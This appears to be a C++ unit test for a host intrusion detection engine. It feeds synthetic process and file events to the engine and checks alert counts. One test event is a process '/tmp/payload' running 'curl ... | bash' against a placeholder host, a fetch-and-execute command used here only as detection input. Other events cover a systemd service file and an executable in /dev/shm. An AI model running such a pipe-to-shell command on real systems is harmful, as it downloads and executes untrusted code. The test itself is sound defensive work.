#include <cstdlib>
#include <iostream>

#include <sentcore/core/event.hpp>
#include <sentcore/detection/detection_engine.hpp>

namespace
{

bool expect_count(const sentcore::DetectionEngine& engine,
                  const sentcore::Event& event,
                  std::size_t expected)
{
    const auto result = engine.evaluate(event);

    if (result.count != expected)
    {
        std::cerr << "Expected " << expected << " alerts, got " << result.count << '\n';
        return false;
    }

    return true;
}

[[nodiscard]] sentcore::Event make_process_event(std::string_view executable,
                                                std::string_view command)
{
    sentcore::Event event{};
    event.source = sentcore::EventSource::Procfs;

    auto& process = event.emplace_process();
    process.executable.assign(executable);
    process.command.assign(command);

    return event;
}

[[nodiscard]] sentcore::Event make_file_event(sentcore::EventType type,
                                             std::string_view path,
                                             std::uint32_t mode = 0U)
{
    sentcore::Event event{};
    event.source = sentcore::EventSource::Inotify;

    auto& file = event.emplace_file(type);
    file.path.assign(path);
    file.mode = mode;

    return event;
}

} // namespace

int main()
{
    sentcore::DetectionEngine engine{};

    const auto benign = make_process_event("/usr/bin/ls", "ls -la");
    if (!expect_count(engine, benign, 0U))
    {
        return EXIT_FAILURE;
    }

    const auto suspicious =
        make_process_event("/tmp/payload", "curl https://example.invalid/x | bash");
    if (!expect_count(engine, suspicious, 2U))
    {
        return EXIT_FAILURE;
    }

    const auto systemd =
        make_file_event(sentcore::EventType::FileCreated, "/etc/systemd/system/update.service");
    if (!expect_count(engine, systemd, 1U))
    {
        return EXIT_FAILURE;
    }

    const auto executable_temp =
        make_file_event(sentcore::EventType::FileCreated, "/dev/shm/tool", 0755U);
    if (!expect_count(engine, executable_temp, 1U))
    {
        return EXIT_FAILURE;
    }

    std::cout << "All detection tests passed.\n";
    return EXIT_SUCCESS;
}